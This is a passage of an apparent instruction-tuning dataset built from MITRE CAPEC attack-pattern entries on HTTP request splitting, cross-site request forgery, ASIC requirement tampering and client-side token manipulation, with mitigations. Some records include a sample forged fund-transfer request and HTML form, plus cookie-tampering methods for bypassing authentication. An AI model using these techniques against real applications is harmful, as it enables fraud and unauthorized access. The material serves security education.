            "An adversary abuses the flexibility and discrepancies in the parsing and interpretation of HTTP Request messages by different intermediary HTTP agents (e.g., load balancer, reverse proxy, web caching proxies, application firewalls, etc.) to split a single HTTP request into multiple unauthorized and malicious HTTP requests to a back-end HTTP agent (e.g., web server).",
            "See CanPrecede relationships for possible consequences."
          ]
        },
        "Extended_Description": {
          "xhtml:p": [
            "This entails the adversary injecting malicious user input into various standard and/or user defined HTTP headers within a HTTP Request through user input of Carriage Return (CR), Line Feed (LF), Horizontal Tab (HT), Space (SP) characters as well as other valid/RFC compliant special characters and unique character encoding. This malicious user input allows for web script to be injected in HTTP headers as well as into browser cookies or Ajax web/browser object parameters like XMLHttpRequest during implementation of asynchronous requests.",
            "This attack is usually the result of the usage of outdated or incompatible HTTP protocol versions as well as lack of syntax checking and filtering of user input in the HTTP agents receiving HTTP messages in the path.",
            {
              "xhtml:i": "back-end HTTP agent",
              "#text": "This differs from CAPEC-34 HTTP Response Splitting, which is usually an attempt to compromise a client agent (e.g., web browser) by sending malicious content in HTTP responses from back-end HTTP infrastructure. HTTP Request Splitting is an attempt to compromise avia HTTP Request messages."
            },
            "HTTP Smuggling (CAPEC-33 and CAPEC-273) is different from HTTP Splitting due to the fact it relies upon discrepancies in the interpretation of various HTTP Headers and message sizes and not solely user input of special characters and character encoding. HTTP Smuggling was established to circumvent mitigations against HTTP Request Splitting techniques."
          ]
        },
        "Likelihood_Of_Attack": "Medium",
        "Typical_Severity": "High",
        "Related_Attack_Patterns": {
          "Related_Attack_Pattern": [
            {
              "@Nature": "ChildOf",
              "@CAPEC_ID": "220"
            },
            {
              "@Nature": "PeerOf",
              "@CAPEC_ID": "34"
            },
            {
              "@Nature": "CanPrecede",
              "@CAPEC_ID": "115"
            },
            {
              "@Nature": "CanPrecede",
              "@CAPEC_ID": "141"
            },
            {
              "@Nature": "CanPrecede",
              "@CAPEC_ID": "63"
            },
            {
              "@Nature": "CanPrecede",
              "@CAPEC_ID": "593"
            },
            {
              "@Nature": "CanPrecede",
              "@CAPEC_ID": "148"
            },
            {
              "@Nature": "CanPrecede",
              "@CAPEC_ID": "154"
            }
          ]
        },
        "Execution_Flow": {
          "Attack_Step": [
            {
              "Step": "1",
              "Phase": "Explore",
              "Description": "[Survey network to identify target] The adversary performs network reconnaissance by monitoring relevant traffic to identify the network path and parsing of the HTTP messages with the goal of identifying potential targets.",
              "Technique": "Scan networks to fingerprint HTTP infrastructure and monitor HTTP traffic to identify HTTP network path with a tool such as a Network Protocol Analyzer."
            },
            {
              "Step": "1",
              "Phase": "Experiment",
              "Description": "[Identify vulnerabilities in targeted HTTP infrastructure and technologies] The adversary sends a variety of benign/ambiguous HTTP requests to observe responses from HTTP infrastructure in order to identify differences/discrepancies in the interpretation and parsing of HTTP requests by examining supported HTTP protocol versions, HTTP headers, syntax checking and input filtering."
            },
            {
              "Step": "2",
              "Phase": "Experiment",
              "Description": "[Cause differential HTTP responses by experimenting with identified HTTP Request vulnerabilities] The adversary sends maliciously crafted HTTP requests with custom strings and embedded web scripts and objects in HTTP headers to interfere with the parsing of intermediary and back-end HTTP infrastructure, followed by normal/benign HTTP request from the adversary or a random user. The intended consequences of the malicious HTTP requests will be observed in the HTTP infrastructure response to the normal/benign HTTP request to confirm applicability of identified vulnerabilities in the adversary's plan of attack.",
              "Technique": [
                "Continue the monitoring of HTTP traffic.",
                {
                  "xhtml:p": [
                    "Utilize different sequences of special characters (CR - Carriage Return, LF - Line Feed, HT - Horizontal Tab, SP - Space and etc.) to bypass filtering and back-end encoding and to embed:",
                    "to utilize additional special characters (e.g., > and <) filtered by the target HTTP agent.",
                    "Note that certain special characters and character encoding may be applicable only to intermediary and front-end agents with rare configurations or that are not RFC compliant."
                  ],
                  "xhtml:ul": {
                    "xhtml:li": [
                      "additional HTTP Requests with their own headers",
                      "malicious web scripts into parameters of HTTP Request headers (e.g., browser cookies like Set-Cookie or Ajax web/browser object parameters like XMLHttpRequest)",
                      "adversary chosen encoding (e.g., UTF-7)"
                    ]
                  }
                },
                "Follow an unrecognized (sometimes a RFC compliant) HTTP header with a subsequent HTTP request to potentially cause the HTTP request to be ignored and interpreted as part of the preceding HTTP request."
              ]
            },
            {
              "Step": "1",
              "Phase": "Exploit",
              "Description": "[Perform HTTP Request Splitting attack] Using knowledge discovered in the experiment section above, smuggle a message to cause one of the consequences.",
              "Technique": "Leverage techniques identified in the Experiment Phase."
            }
          ]
        },
        "Prerequisites": {
          "Prerequisite": [
            "An additional intermediary HTTP agent such as an application firewall or a web caching proxy between the adversary and the second agent such as a web server, that sends multiple HTTP messages over same network connection.",
            "Differences in the way the two HTTP agents parse and interpret HTTP requests and its headers.",
            "HTTP headers capable of being user-manipulated.",
            "HTTP agents running on HTTP/1.0 or HTTP/1.1 that allow for Keep Alive mode, Pipelined queries, and Chunked queries and responses."
          ]
        },
        "Skills_Required": {
          "Skill": [
            {
              "@Level": "Medium",
              "#text": "Detailed knowledge on HTTP protocol: request and response messages structure and usage of specific headers."
            },
            {
              "@Level": "Medium",
              "#text": "Detailed knowledge on how specific HTTP agents receive, send, process, interpret, and parse a variety of HTTP messages and headers."
            },
            {
              "@Level": "Medium",
              "#text": "Possess knowledge on the exact details in the discrepancies between several targeted HTTP agents in path of an HTTP message in parsing its message structure and individual headers."
            }
          ]
        },
        "Resources_Required": {
          "Resource": "Tools capable of crafting malicious HTTP messages and monitoring HTTP messages responses."
        },
        "Indicators": {
          "Indicator": "Differences in requests processed by the two agents. This requires careful monitoring or a capable log analysis tool."
        },
        "Consequences": {
          "Consequence": [
            {
              "Scope": [
                "Confidentiality",
                "Integrity",
                "Availability"
              ],
              "Impact": "Execute Unauthorized Commands"
            },
            {
              "Scope": [
                "Confidentiality",
                "Access Control",
                "Authorization"
              ],
              "Impact": "Gain Privileges"
            },
            {
              "Scope": "Confidentiality",
              "Impact": "Read Data"
            },
            {
              "Scope": "Integrity",
              "Impact": "Modify Data"
            }
          ]
        },
        "Mitigations": {
          "Mitigation": [
            "Design: evaluate HTTP agents prior to deployment for parsing/interpretation discrepancies.",
            "Configuration: front-end HTTP agents notice ambiguous requests.",
            "Configuration: back-end HTTP agents reject ambiguous requests and close the network connection.",
            "Configuration: Disable reuse of back-end connections.",
            "Configuration: Use HTTP/2 for back-end connections.",
            "Configuration: Use the same web server software for front-end and back-end server.",
            "Implementation: Utilize a Web Application Firewall (WAF) that has built-in mitigation to detect abnormal requests/responses.",
            "Configuration: Install latest vendor security patches available for both intermediary and back-end HTTP infrastructure (i.e. proxies and web servers)",
            "Configuration: Ensure that HTTP infrastructure in the chain or network path utilize a strict uniform parsing process.",
            "Implementation: Utilize intermediary HTTP infrastructure capable of filtering and/or sanitizing user-input."
          ]
        },
        "Example_Instances": {
          "Example": {
            "xhtml:p": "Microsoft Internet Explorer versions 5.01 SP4 and prior, 6.0 SP2 and prior, and 7.0 contain a vulnerability that could allow an unauthenticated, remote adversary to conduct HTTP request splitting and smuggling attacks. The vulnerability is due to an input validation error in the browser that allows adversaries to manipulate certain headers to expose the browser to HTTP request splitting and smuggling attacks. Attacks may include cross-site scripting, proxy cache poisoning, and session fixation. In certain instances, an exploit could allow the adversary to bypass web application firewalls or other filtering devices. Microsoft has confirmed the vulnerability and released software updates."
          }
        },
        "Related_Weaknesses": {
          "Related_Weakness": [
            {
              "@CWE_ID": "74"
            },
            {
              "@CWE_ID": "113"
            },
            {
              "@CWE_ID": "138"
            },
            {
              "@CWE_ID": "436"
            }
          ]
        },
        "Taxonomy_Mappings": {
          "Taxonomy_Mapping": {
            "@Taxonomy_Name": "WASC",
            "Entry_ID": "24",
            "Entry_Name": "HTTP Request Splitting"
          }
        },
        "References": {
          "Reference": [
            {
              "@External_Reference_ID": "REF-117"
            },
            {
              "@External_Reference_ID": "REF-617"
            },
            {
              "@External_Reference_ID": "REF-679"
            }
          ]
        },
        "Notes": {
          "Note": [
            {
              "@Type": "Terminology",
              "#text": "HTTP Splitting \u2013 \"the act of forcing a sender of (HTTP) messages to emit data stream consisting of more messages than the sender\u2019s intension. The messages sent are 100% valid and RFC compliant\" [REF-117]."
            },
            {
              "@Type": "Terminology",
              "#text": "HTTP Smuggling \u2013 \"the act of forcing a sender of (HTTP) messages to emit data stream which may be parsed as a different set of messages (i.e. dislocated message boundaries) than the sender\u2019s intention. This is done by virtue of forcing the sender to emit non-standard messages which can be interpreted in more than one way\" [REF-117]."
            },
            {
              "@Type": "Relationship",
              "#text": "HTTP Smuggling is an evolution of previous HTTP Splitting techniques which are commonly remediated against."
            }
          ]
        },
        "Content_History": {
          "Submission": {
            "Submission_Name": "CAPEC Content Team",
            "Submission_Organization": "The MITRE Corporation",
            "Submission_Date": "2014-06-23"
          },
          "Modification": [
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2017-08-04",
              "Modification_Comment": "Updated Related_Attack_Patterns, Resources_Required"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2019-04-04",
              "Modification_Comment": "Updated Related_Attack_Patterns"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2020-07-30",
              "Modification_Comment": "Updated Related_Weaknesses"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2020-12-17",
              "Modification_Comment": "Updated @Abstraction, References, Taxonomy_Mappings"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2021-10-21",
              "Modification_Comment": "Updated @Status, Consequences, Description, Example_Instances, Execution_Flow, Extended_Description, Indicators, Mitigations, Notes, Prerequisites, References, Related_Attack_Patterns, Related_Weaknesses, Resources_Required, Skills_Required"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2022-09-29",
              "Modification_Comment": "Updated Extended_Description, Related_Weaknesses"
            }
          ]
        }
      }
    }
  },
  {
    "instruction": "Are there any examples for 'Cross Site Request Forgery (CAPEC ID: 62)' attack pattern",
    "context": "",
    "output": "Yes. You can have a look at the following example: While a user is logged into their bank account, an attacker can send an email with some potentially interesting content and require the user to click on a link in the email.\n- The link points to or contains an attacker setup script, probably even within an iFrame, that mimics an actual user form submission to perform a malicious activity, such as transferring funds from the victim's account.\n- The attacker can have the script embedded in, or targeted by, the link perform any arbitrary action as the authenticated user. When this script is executed, the targeted application authenticates and accepts the actions based on the victims existing session cookie.",
    "category": "CAPECFlan",
    "instruction_type": "capec_example_instances",
    "parsed_raw_data": {
      "Example_Instances": [
        "While a user is logged into their bank account, an attacker can send an email with some potentially interesting content and require the user to click on a link in the email.",
        "The link points to or contains an attacker setup script, probably even within an iFrame, that mimics an actual user form submission to perform a malicious activity, such as transferring funds from the victim's account.",
        "The attacker can have the script embedded in, or targeted by, the link perform any arbitrary action as the authenticated user. When this script is executed, the targeted application authenticates and accepts the actions based on the victims existing session cookie."
      ],
      "@Name": "Cross Site Request Forgery (CAPEC ID: 62)",
      "attack_ptrn": {
        "@ID": "62",
        "@Name": "Cross Site Request Forgery",
        "@Abstraction": "Standard",
        "@Status": "Draft",
        "Description": "An attacker crafts malicious web links and distributes them (via web pages, email, etc.), typically in a targeted manner, hoping to induce users to click on the link and execute the malicious action against some third-party application. If successful, the action embedded in the malicious link will be processed and accepted by the targeted application with the users' privilege level. This type of attack leverages the persistence and implicit trust placed in user session cookies by many web applications today. In such an architecture, once the user authenticates to an application and a session cookie is created on the user's system, all following transactions for that session are authenticated using that cookie including potential actions initiated by an attacker and simply \"riding\" the existing session cookie.",
        "Alternate_Terms": {
          "Alternate_Term": {
            "Term": "Session Riding"
          }
        },
        "Likelihood_Of_Attack": "High",
        "Typical_Severity": "Very High",
        "Related_Attack_Patterns": {
          "Related_Attack_Pattern": {
            "@Nature": "ChildOf",
            "@CAPEC_ID": "21"
          }
        },
        "Execution_Flow": {
          "Attack_Step": [
            {
              "Step": "1",
              "Phase": "Explore",
              "Description": "[Explore target website] The attacker first explores the target website to determine pieces of functionality that are of interest to them (e.g. money transfers). The attacker will need a legitimate user account on the target website. It would help to have two accounts.",
              "Technique": [
                "Use web application debugging tool such as WebScarab, Tamper Data or TamperIE to analyze the information exchanged between the client and the server",
                "Use network sniffing tool such as Wireshark to analyze the information exchanged between the client and the server",
                "View HTML source of web pages that contain links or buttons that perform actions of interest."
              ]
            },
            {
              "Step": "2",
              "Phase": "Experiment",
              "Description": "[Create a link that when clicked on, will execute the interesting functionality.] The attacker needs to create a link that will execute some interesting functionality such as transfer money, change a password, etc.",
              "Technique": [
                "Create a GET request containing all required parameters (e.g. https://www.somebank.com/members/transfer.asp?to=012345678901&amt=10000)",
                "Create a form that will submit a POST request (e.g. <form method=\"POST\" action=\"https://www.somebank.com/members/transfer.asp\"><input type=\"hidden\" Name=\"to\" value=\"012345678901\"/><input type=\"hidden\" Name=\"amt\" value=\"10000\"/><input type=\"submit\" src=\"clickhere.jpg\"/></form>"
              ]
            },
            {
              "Step": "3",
              "Phase": "Exploit",
              "Description": "[Convince user to click on link] Finally, the attacker needs to convince a user that is logged into the target website to click on a link to execute the CSRF attack.",
              "Technique": [
                "Execute a phishing attack and send the user an e-mail convincing them to click on a link.",
                "Execute a stored XSS attack on a website to permanently embed the malicious link into the website.",
                "Execute a stored XSS attack on a website where an XMLHTTPRequest object will automatically execute the attack as soon as a user visits the page. This removes the step of convincing a user to click on a link.",
                "Include the malicious link on the attackers' own website where the user may have to click on the link, or where an XMLHTTPRequest object may automatically execute the attack when a user visits the site."
              ]
            }
          ]
        },
        "Skills_Required": {
          "Skill": {
            "@Level": "Medium",
            "#text": "The attacker needs to figure out the exact invocation of the targeted malicious action and then craft a link that performs the said action. Having the user click on such a link is often accomplished by sending an email or posting such a link to a bulletin board or the likes."
          }
        },
        "Resources_Required": {
          "Resource": "All the attacker needs is the exact representation of requests to be made to the application and to be able to get the malicious link across to a victim."
        },
        "Consequences": {
          "Consequence": [
            {
              "Scope": [
                "Confidentiality",
                "Access Control",
                "Authorization"
              ],
              "Impact": "Gain Privileges"
            },
            {
              "Scope": "Confidentiality",
              "Impact": "Read Data"
            },
            {
              "Scope": "Integrity",
              "Impact": "Modify Data"
            }
          ]
        },
        "Mitigations": {
          "Mitigation": [
            "Use cryptographic tokens to associate a request with a specific action. The token can be regenerated at every request so that if a request with an invalid token is encountered, it can be reliably discarded. The token is considered invalid if it arrived with a request other than the action it was supposed to be associated with.",
            "Although less reliable, the use of the optional HTTP Referrer header can also be used to determine whether an incoming request was actually one that the user is authorized for, in the current context.",
            "Additionally, the user can also be prompted to confirm an action every time an action concerning potentially sensitive data is invoked. This way, even if the attacker manages to get the user to click on a malicious link and request the desired action, the user has a chance to recover by denying confirmation. This solution is also implicitly tied to using a second factor of authentication before performing such actions.",
            "In general, every request must be checked for the appropriate authentication token as well as authorization in the current session context."
          ]
        },
        "Example_Instances": {
          "Example": {
            "xhtml:p": [
              "While a user is logged into their bank account, an attacker can send an email with some potentially interesting content and require the user to click on a link in the email.",
              "The link points to or contains an attacker setup script, probably even within an iFrame, that mimics an actual user form submission to perform a malicious activity, such as transferring funds from the victim's account.",
              "The attacker can have the script embedded in, or targeted by, the link perform any arbitrary action as the authenticated user. When this script is executed, the targeted application authenticates and accepts the actions based on the victims existing session cookie."
            ],
            "#text": "See also: Cross-site request forgery (CSRF) vulnerability in util.pl in @Mail WebMail 4.51 allows remote attackers to modify arbitrary settings and perform unauthorized actions as an arbitrary user, as demonstrated using a settings action in the SRC attribute of an IMG element in an HTML e-mail."
          }
        },
        "Related_Weaknesses": {
          "Related_Weakness": [
            {
              "@CWE_ID": "352"
            },
            {
              "@CWE_ID": "306"
            },
            {
              "@CWE_ID": "664"
            },
            {
              "@CWE_ID": "732"
            },
            {
              "@CWE_ID": "1275"
            }
          ]
        },
        "Taxonomy_Mappings": {
          "Taxonomy_Mapping": [
            {
              "@Taxonomy_Name": "WASC",
              "Entry_ID": "09",
              "Entry_Name": "Cross-Site Request Forgery"
            },
            {
              "@Taxonomy_Name": "OWASP Attacks",
              "Entry_Name": "Cross Site Request Forgery (CSRF)"
            }
          ]
        },
        "References": {
          "Reference": [
            {
              "@External_Reference_ID": "REF-62"
            },
            {
              "@External_Reference_ID": "REF-602",
              "@Section": "Testing for Cross Site Request Forgery"
            }
          ]
        },
        "Content_History": {
          "Submission": {
            "Submission_Name": "CAPEC Content Team",
            "Submission_Organization": "The MITRE Corporation",
            "Submission_Date": "2014-06-23"
          },
          "Modification": [
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2015-11-09",
              "Modification_Comment": "Updated Attack_Phases"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2015-12-07",
              "Modification_Comment": "Updated Attack_Phases"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2017-01-09",
              "Modification_Comment": "Updated Alternate_Terms, Attack_Phases"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2017-05-01",
              "Modification_Comment": "Updated Attack_Phases"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2017-08-04",
              "Modification_Comment": "Updated Attack_Phases, Related_Attack_Patterns"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2018-07-31",
              "Modification_Comment": "Updated Attack_Phases, References"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2020-07-30",
              "Modification_Comment": "Updated Example_Instances, Execution_Flow, Related_Weaknesses"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2020-12-17",
              "Modification_Comment": "Updated References, Taxonomy_Mappings"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2021-06-24",
              "Modification_Comment": "Updated Related_Weaknesses"
            }
          ],
          "Previous_Entry_Name": {
            "@Date": "2017-01-09",
            "#text": "Cross Site Request Forgery (aka Session Riding)"
          }
        }
      }
    }
  },
  {
    "instruction": "What are possible examples for implementing the attack pattern: Requirements for ASIC Functionality Maliciously Altered (CAPEC ID: 671)",
    "context": "",
    "output": "Possible examples: An adversary with access to ASIC functionality requirements for various customers, targets a particular customer\u2019s ordered lot of ASICs by altering its functional requirements such that the ASIC design will result in a manufactured chip that does not meet the customer\u2019s capability needs.",
    "category": "CAPECFlan",
    "instruction_type": "capec_example_instances",
    "parsed_raw_data": {
      "Example_Instances": "An adversary with access to ASIC functionality requirements for various customers, targets a particular customer\u2019s ordered lot of ASICs by altering its functional requirements such that the ASIC design will result in a manufactured chip that does not meet the customer\u2019s capability needs.",
      "@Name": "Requirements for ASIC Functionality Maliciously Altered (CAPEC ID: 671)",
      "attack_ptrn": {
        "@ID": "671",
        "@Name": "Requirements for ASIC Functionality Maliciously Altered",
        "@Abstraction": "Detailed",
        "@Status": "Draft",
        "Description": "An adversary with access to functional requirements for an application specific integrated circuit (ASIC), a chip designed/customized for a singular particular use, maliciously alters requirements derived from originating capability needs. In the chip manufacturing process, requirements drive the chip design which, when the chip is fully manufactured, could result in an ASIC which may not meet the user\u2019s needs, contain malicious functionality, or exhibit other anomalous behaviors thereby affecting the intended use of the ASIC.",
        "Likelihood_Of_Attack": "Low",
        "Typical_Severity": "High",
        "Related_Attack_Patterns": {
          "Related_Attack_Pattern": {
            "@Nature": "ChildOf",
            "@CAPEC_ID": "447"
          }
        },
        "Prerequisites": {
          "Prerequisite": "An adversary would need to have access to a foundry\u2019s or chip maker\u2019s requirements management system that stores customer requirements for ASICs, requirements upon which the design of the ASIC is based."
        },
        "Skills_Required": {
          "Skill": {
            "@Level": "High",
            "#text": "An adversary would need experience in designing chips based on functional requirements in order to manipulate requirements in such a way that deviations would not be detected in subsequent stages of ASIC manufacture and where intended malicious functionality would be available to the adversary once integrated into a system and fielded."
          }
        },
        "Consequences": {
          "Consequence": {
            "Scope": "Integrity",
            "Impact": "Alter Execution Logic"
          }
        },
        "Mitigations": {
          "Mitigation": [
            "Utilize DMEA\u2019s (Defense Microelectronics Activity) Trusted Foundry Program members for acquisition of microelectronic components.",
            "Ensure that each supplier performing hardware development implements comprehensive, security-focused configuration management including for hardware requirements and design.",
            "Require that provenance of COTS microelectronic components be known whenever procured.",
            "Conduct detailed vendor assessment before acquiring COTS hardware."
          ]
        },
        "Example_Instances": {
          "Example": "An adversary with access to ASIC functionality requirements for various customers, targets a particular customer\u2019s ordered lot of ASICs by altering its functional requirements such that the ASIC design will result in a manufactured chip that does not meet the customer\u2019s capability needs."
        },
        "Taxonomy_Mappings": {
          "Taxonomy_Mapping": {
            "@Taxonomy_Name": "ATTACK",
            "Entry_ID": "1195.003",
            "Entry_Name": "Supply Chain Compromise: Compromise Hardware Supply Chain"
          }
        },
        "References": {
          "Reference": {
            "@External_Reference_ID": "REF-439"
          }
        },
        "Content_History": {
          "Submission": {
            "Submission_Name": "CAPEC Content Team",
            "Submission_Organization": "The MITRE Corporation",
            "Submission_Date": "2021-06-24"
          },
          "Modification": [
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2022-02-22",
              "Modification_Comment": "Updated References"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2022-09-29",
              "Modification_Comment": "Updated Taxonomy_Mappings"
            }
          ]
        }
      }
    }
  },
  {
    "instruction": "Give me an usage example for attack pattern - Manipulating Opaque Client-based Data Tokens (CAPEC ID: 39)",
    "context": "",
    "output": "With certain price watching websites, that aggregate products available prices, the user can buy items through whichever vendors has product availability, the best price, or other differentiator. Once a user selects an item, the site must broker the purchase of that item with the vendor. Because vendors sell the same product through different channel partners at different prices, token exchange between price watching sites and selling vendors will often contain pricing information. With some price watching sites, manipulating URL-data (which is encrypted) even opaquely yields different prices charged by the fulfilling vendor. If the manipulated price turns out higher, the Attacker can cancel purchase. If the Attacker succeeded in manipulating the token and creating a lower price, they proceed.\n* Upon successful authentication user is granted an encrypted authentication cookie by the server and it is stored on the client. One piece of information stored in the authentication cookie reflects the access level of the user (e.g. \"u\" for user). The authentication cookie is encrypted using the Electronic Code Book (ECB) mode, that naively encrypts each of the plaintext blocks to each of the ciphertext blocks separately. An attacker knows the structure of the cookie and can figure out what bits (encrypted) store the information relating to the access level of the user. An attacker modifies the authentication cookie and effectively substitutes \"u\" for \"a\" by flipping some of the corresponding bits of ciphertext (trial and error). Once the correct \"flip\" is found, when the system is accessed, the attacker is granted administrative privileges in the system. Note that in this case an attacker did not have to figure out the exact encryption algorithm or find the secret key, but merely exploit the weakness inherent in using the ECB encryption mode.\n* Archangel Weblog 0.90.02 allows remote attackers to bypass authentication by setting the ba_admin cookie to 1. See also: CVE-2006-0944",
    "category": "CAPECFlan",
    "instruction_type": "capec_example_instances",
    "parsed_raw_data": {
      "Example_Instances": [
        "With certain price watching websites, that aggregate products available prices, the user can buy items through whichever vendors has product availability, the best price, or other differentiator. Once a user selects an item, the site must broker the purchase of that item with the vendor. Because vendors sell the same product through different channel partners at different prices, token exchange between price watching sites and selling vendors will often contain pricing information. With some price watching sites, manipulating URL-data (which is encrypted) even opaquely yields different prices charged by the fulfilling vendor. If the manipulated price turns out higher, the Attacker can cancel purchase. If the Attacker succeeded in manipulating the token and creating a lower price, they proceed.",
        "Upon successful authentication user is granted an encrypted authentication cookie by the server and it is stored on the client. One piece of information stored in the authentication cookie reflects the access level of the user (e.g. \"u\" for user). The authentication cookie is encrypted using the Electronic Code Book (ECB) mode, that naively encrypts each of the plaintext blocks to each of the ciphertext blocks separately. An attacker knows the structure of the cookie and can figure out what bits (encrypted) store the information relating to the access level of the user. An attacker modifies the authentication cookie and effectively substitutes \"u\" for \"a\" by flipping some of the corresponding bits of ciphertext (trial and error). Once the correct \"flip\" is found, when the system is accessed, the attacker is granted administrative privileges in the system. Note that in this case an attacker did not have to figure out the exact encryption algorithm or find the secret key, but merely exploit the weakness inherent in using the ECB encryption mode.",
        "Archangel Weblog 0.90.02 allows remote attackers to bypass authentication by setting the ba_admin cookie to 1. See also: CVE-2006-0944"
      ],
      "@Name": "Manipulating Opaque Client-based Data Tokens (CAPEC ID: 39)",
      "attack_ptrn": {
        "@ID": "39",
        "@Name": "Manipulating Opaque Client-based Data Tokens",
        "@Abstraction": "Standard",
        "@Status": "Draft",
        "Description": "In circumstances where an application holds important data client-side in tokens (cookies, URLs, data files, and so forth) that data can be manipulated. If client or server-side application components reinterpret that data as authentication tokens or data (such as store item pricing or wallet information) then even opaquely manipulating that data may bear fruit for an Attacker. In this pattern an attacker undermines the assumption that client side tokens have been adequately protected from tampering through use of encryption or obfuscation.",
        "Likelihood_Of_Attack": "High",
        "Typical_Severity": "Medium",
        "Related_Attack_Patterns": {
          "Related_Attack_Pattern": {
            "@Nature": "ChildOf",
            "@CAPEC_ID": "22",
            "Exclude_Related": {
              "@Exclude_ID": "512"
            }
          }
        },
        "Execution_Flow": {
          "Attack_Step": [
            {
              "Step": "1",
              "Phase": "Explore",
              "Description": "[Enumerate information passed to client side] The attacker identifies the parameters used as part of tokens to take business or security decisions",
              "Technique": [
                "Use WebScarab to reveal hidden fields while browsing.",
                "Use a sniffer to capture packets",
                "View source of web page to find hidden fields",
                "Examine URL to see if any opaque tokens are in it",
                "Disassemble or decompile client-side application",
                "Use debugging tools such as File Monitor, Registry Monitor, Debuggers, etc."
              ]
            },
            {
              "Step": "2",
              "Phase": "Explore",
              "Description": "[Determine protection mechanism for opaque token] The attacker determines the protection mechanism used to protect the confidentiality and integrity of these data tokens. They may be obfuscated or a full blown encryption may be used.",
              "Technique": [
                "Look for signs of well-known character encodings",
                "Look for cryptographic signatures",
                "Look for delimiters or other indicators of structure"
              ]
            },
            {
              "Step": "3",
              "Phase": "Experiment",
              "Description": "[Modify parameter/token values] Trying each parameter in turn, the attacker modifies the values",
              "Technique": [
                "Modify tokens logically",
                "Modify tokens arithmetically",
                "Modify tokens bitwise",
                "Modify structural components of tokens",
                "Modify order of parameters/tokens"
              ]
            },
            {
              "Step": "4",
              "Phase": "Experiment",
              "Description": "[Cycle through values for each parameter.] Depending on the nature of the application, the attacker now cycles through values of each parameter and observes the effects of this modification in the data returned by the server",
              "Technique": [
                "Use network-level packet injection tools such as netcat",
                "Use application-level data modification tools such as Tamper Data, WebScarab, TamperIE, etc.",
                "Use modified client (modified by reverse engineering)",
                "Use debugging tools to modify data in client"
              ]
            }
          ]
        },
        "Prerequisites": {
          "Prerequisite": [
            "An attacker already has some access to the system or can steal the client based data tokens from another user who has access to the system.",
            "For an Attacker to viably execute this attack, some data (later interpreted by the application) must be held client-side in a way that can be manipulated without detection. This means that the data or tokens are not CRCd as part of their value or through a separate meta-data store elsewhere."
          ]
        },
        "Skills_Required": {
          "Skill": [
            {
              "@Level": "Medium",
              "#text": "If the client site token is obfuscated."
            },
            {
              "@Level": "High",
              "#text": "If the client site token is encrypted."
            }
          ]
        },
        "Resources_Required": {
          "Resource": "The Attacker needs no special hardware-based resources in order to conduct this attack. Software plugins, such as Tamper Data for Firefox, may help in manipulating URL- or cookie-based data."
        },
        "Consequences": {
          "Consequence": [
            {
              "Scope": "Integrity",
              "Impact": "Modify Data"
            },
            {
              "Scope": [
                "Confidentiality",
                "Access Control",
                "Authorization"
              ],
              "Impact": "Gain Privileges"
            }
          ]
        },
        "Mitigations": {
          "Mitigation": [
            "One solution to this problem is to protect encrypted data with a CRC of some sort. If knowing who last manipulated the data is important, then using a cryptographic \"message authentication code\" (or hMAC) is prescribed. However, this guidance is not a panacea. In particular, any value created by (and therefore encrypted by) the client, which itself is a \"malicious\" value, all the protective cryptography in the world can't make the value 'correct' again. Put simply, if the client has control over the whole process of generating and encoding the value, then simply protecting its integrity doesn't help.",
            "Make sure to protect client side authentication tokens for confidentiality (encryption) and integrity (signed hash)",
            "Make sure that all session tokens use a good source of randomness",
            "Perform validation on the server side to make sure that client side data tokens are consistent with what is expected."
          ]
        },
        "Example_Instances": {
          "Example": [
            "With certain price watching websites, that aggregate products available prices, the user can buy items through whichever vendors has product availability, the best price, or other differentiator. Once a user selects an item, the site must broker the purchase of that item with the vendor. Because vendors sell the same product through different channel partners at different prices, token exchange between price watching sites and selling vendors will often contain pricing information. With some price watching sites, manipulating URL-data (which is encrypted) even opaquely yields different prices charged by the fulfilling vendor. If the manipulated price turns out higher, the Attacker can cancel purchase. If the Attacker succeeded in manipulating the token and creating a lower price, they proceed.",
            "Upon successful authentication user is granted an encrypted authentication cookie by the server and it is stored on the client. One piece of information stored in the authentication cookie reflects the access level of the user (e.g. \"u\" for user). The authentication cookie is encrypted using the Electronic Code Book (ECB) mode, that naively encrypts each of the plaintext blocks to each of the ciphertext blocks separately. An attacker knows the structure of the cookie and can figure out what bits (encrypted) store the information relating to the access level of the user. An attacker modifies the authentication cookie and effectively substitutes \"u\" for \"a\" by flipping some of the corresponding bits of ciphertext (trial and error). Once the correct \"flip\" is found, when the system is accessed, the attacker is granted administrative privileges in the system. Note that in this case an attacker did not have to figure out the exact encryption algorithm or find the secret key, but merely exploit the weakness inherent in using the ECB encryption mode.",
